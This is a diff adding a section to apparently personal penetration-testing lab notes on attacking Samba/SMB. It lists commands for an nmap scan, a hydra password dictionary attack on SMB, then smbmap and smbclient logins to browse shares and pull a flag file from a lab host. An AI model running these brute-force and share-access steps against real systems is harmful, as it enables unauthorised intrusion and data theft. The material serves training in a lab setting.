@@ -363,3 +363,20 @@ FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to 
 Samba is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices. Typically configured to run on port 445.
 
 
+### Exploiting SAMBA
+
+SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a LAN. SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139. Samba is the Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.
+
+### Practical Samba Recon: Dictionary Attack
+
+- `nmap -sV demo.ine.local`
+- `hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`
+- `smbmap -H 192.28.24.3 -u admin -p password1`
+- `smbclient -L 192.28.24.3 -U admin`
+- `smbclient //192.28.24.3/shawn -U admin` Access the share shawn with the user admin
+- `smbclient //192.28.24.3/admin -U admin`
+- `ls`
+- `cd hidden`
+- `get flag.tar.gz`
+- `tar xzf flag.tar.gz`
+- `cat flag`
